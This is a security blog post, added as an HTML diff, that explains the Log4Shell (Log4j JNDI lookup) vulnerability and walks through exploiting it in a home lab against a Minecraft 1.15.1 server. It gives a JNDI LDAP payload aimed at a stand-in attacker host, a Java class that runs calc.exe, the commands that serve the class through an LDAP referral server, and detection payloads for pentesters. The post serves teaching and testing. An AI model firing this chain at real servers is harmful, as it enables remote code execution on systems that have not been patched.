@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Recreate, detect and exploit the Log4j vulnerability">
+  <meta property="og:description" content="Log4j is a widely used logging library in Java. You use it to log all sort of things  such as network traffic, requests, responses, application operational l...">
+
+  <title>Recreate, detect and exploit the Log4j vulnerability</title>
+  <meta name="description" content="Log4j is a widely used logging library in Java. You use it to log all sort of things  such as network traffic, requests, responses, application operational l...">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.0/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>heckintosh</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/writeups/">Writeups</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Recreate, detect and exploit the Log4j vulnerability</b></h1>
+
+<p class="post-metadata text-muted">
+  11 July 2022 -  
+  <b>5 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#cve">
+      <span class="tag badge badge-pill text-primary border border-primary">CVE</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#log4j">
+      <span class="tag badge badge-pill text-primary border border-primary">Log4j</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#poc">
+      <span class="tag badge badge-pill text-primary border border-primary">PoC</span>
+    </a>
+    </p>
+
+<h1 id="1-what-is-log4j">1. What is Log4J?</h1>
+<p>Log4j is a Java library that is used in many Java-based applications. Java has been around for quite sometimes, therefore many servers are utilizing Log4j. It’s the most popular Java logging option around here.</p>
+
+<h1 id="2-attack-details">2. Attack details</h1>
+<p>Below is the the diagram for the attack flow.</p>
+
+<p><img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/log4j_attack-1024x692.jpg" alt="Log4j attack. Source: cloudtango.net" /></p>
+
+<p>To be more wordy, let’s dive into the attack.</p>
+
+<p>Basically, the log4j maintainers added a message lookup featured a decade ago. So the vulnerablity has just been lying there ever since. When it was found out, the Internet got burned.</p>
+
+<p>This is how the feature is introduced:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lookups provide a way to add values to the log4j configuration at arbitrary places. 
+They are a particular type of Plugin that implements the StrLookup interface.
+</code></pre></div></div>
+
+<p>Everytime users call a logging method, log4j will utilize a format method to search for the <code class="language-plaintext highlighter-rouge">${</code> in each log. If the expression is there, it will be evaluated by the Java lookup and then replaced with the real value. Example, <code class="language-plaintext highlighter-rouge">java:os</code> will be rendered as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows 7 6.1 Service Pack 1, architecture: amd64-64.
+</code></pre></div></div>
+
+<p>There are multi types of lookups:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Jndi Lookup
+JVM Input Arguments Lookup
+Web Lookup
+</code></pre></div></div>
+
+<p>The <a href="https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used">JNDI</a> one supports LDAP and RMI.</p>
+
+<p>Devs often log what users input. If they input something like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://www.hacker.com/malicious_java_class}
+</code></pre></div></div>
+<p>The lookup method will be abused to execute the malicious Java class hosted on the remote LDAP server.</p>
+
+<h1 id="3-building-a-lab">3. Building a lab</h1>
+
+<p>My goal is simple. Exploiting the log4j vulnerability to execute <code class="language-plaintext highlighter-rouge">calc.exe</code> remotely. I will use the environment in which this exploit was first (alledgedly) discovered from. Here are the tools we need:</p>
+
+<ul>
+  <li><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java SE Development Kit 8u181</a></li>
+  <li><a href="https://www.minecraft.net/en-us/article/minecraft-java-edition-1-15-1">Minecraft Server 1.15.1</a></li>
+  <li><a href="https://mc-launcher.com/special/minecraft">Minecraft Client 1.15.1</a></li>
+  <li><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">POC exploit</a></li>
+</ul>
+
+<p><u>Note 1</u>: It’s <span style="color:#e5202a"><b>important</b></span> that you choose the <span style="color:#e5202a"><b>JDK</b></span>, not the JRE! Because JRE doesn’t have javac for compiling.</p>
+
+<p><u>Note 2</u>: remember to choose the right (old) version of JDK since the minecraft server might not be able to understand exploits that are compiled in newer Java version.</p>
+
+<p>What the POC does:</p>
+<ul>
+  <li>Create a LDAP server that will redirect Minecraft server to the exploit (Done by this <a href="https://github.com/mbechler/marshalsec">repo</a>).</li>
+  <li>The Java <code class="language-plaintext highlighter-rouge">Exploit.class</code> (created by <code class="language-plaintext highlighter-rouge">Exploit.java</code>) that will be loaded by the Minecraft server.</li>
+  <li>A <code class="language-plaintext highlighter-rouge">http server</code> from which the Minecraft server will download the Exploit.class</li>
+</ul>
+
+<p>Start by writing the exploit code:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"cmd.exe /c calc.exe"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>We then compile Exploit.java to Exploit.class using javac from JDK 8u181.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac Exploit.java
+</code></pre></div></div>
+
+<p>Use the Python http server to host the exploit class.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 10000
+</code></pre></div></div>
+
+<p>Start the LDAP server and points it to the HTTP server.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/mbechler/marshalsec.git
+<span class="nb">cd </span>marshalsec
+mvn clean package <span class="nt">-DskipTests</span>
+java <span class="nt">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="s2">"http://172.30.146.202:10000/#Exploit"</span>
+</code></pre></div></div>
+
+<p>Run the Minecraft server on a VM (I set it to bridged mode):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Remember to get the IP of the VM. 
+- Mine is 172.30.146.200.
+- For the sake of POC, turn off the firewall so it will allow incoming connections to the server (normally the server administrators would set up firewall specifically for minecraft port).
+- Go to the eula.txt and set eula=true.
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> server.jar
+</code></pre></div></div>
+
+<p>After you start the server a bunch of properties will be filled up in the server.properties file. Go to that file and edit the option online-mode to false. The online-mode option, if set to true, requires all players to be authenticated to Xbox-Live.</p>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_properties.PNG" alt="Minecraft Client" />
+  <center><figcaption>Server properties</figcaption></center>
+</figure>
+
+<p>Rerun the server:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> server.jar
+</code></pre></div></div>
+
+<p>Start the Minecraft client</p>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_launcher.PNG" alt="Minecraft Client" />
+  <center><figcaption>Choose 1.15.1 for the client</figcaption></center>
+</figure>
+
+<p>Connect to the Minecraft server</p>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/Minecraft_direct_connect.PNG" alt="Minecraft Client" />
+  <center><figcaption>Use multiplayer and enter the server IP + port</figcaption></center>
+</figure>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_player_joined.PNG" alt="Minecraft Client" />
+  <center><figcaption>The account is recorded as logged in.</figcaption></center>
+</figure>
+
+<p>Run the exploit</p>
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_poc_cmd.PNG" alt="Minecraft Client" />
+  <center><figcaption>JNDI LDAP Payload</figcaption></center>
+</figure>
+
+<p>The server will then log the chat, evaluate the lookup function, make a connection to the ldap server and then loads the exploit code hosted on the HTTP server:</p>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_log4j_ran.PNG" alt="Minecraft Client" />
+  <center><figcaption>The infamous Calculator.</figcaption></center>
+</figure>
+
+<p>And that’s it. Hope you have fun exploiting Log4J!</p>
+
+<h1 id="4-detecting-log4shell">4. Detecting Log4Shell</h1>
+<p>Detect log4shell is easy. You only need to use the <code class="language-plaintext highlighter-rouge">${jndi:ldap://www.server-you-control.com}</code> as user inputs to the target server. If there is a ping back or a DNS look up for your server after the payload is sent then there is a high chance that the targe server is vulnerable. In case there is a WAF, it will block this malicious payload but there are a bunch of bypasses on Twitter for each specific WAFs that you can try.</p>
+
+<p>For pentesters, use the <a href="https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f">Burp’s Log4Shell Scanner extension</a> and it will automatically replace request inputs with Log4shell payload that includes the generated burp collaborator urls. If you fancy the manual way, you can replace the payload with burp collaborator and check if there is any traffic coming to it. Example: <code class="language-plaintext highlighter-rouge">${jndi:ldap://test.oastify.com}</code></p>
+
+
+
+</div>
+  </main>
+
+  <footer class="mt-auto py-3 text-center">
+
+    <small class="text-muted mb-2">
+      <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+      by <strong>heckintosh</strong>
+    </small>
+  
+    <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:heckintosh@protonmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/heckintosh"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.twitter.com/heckintosh_"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#1da1f2'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-twitter fa-1x"></i>
+    </a>
+
+</div>
+  
+
+    
+  </footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+
+
+</body>
+
+</html>
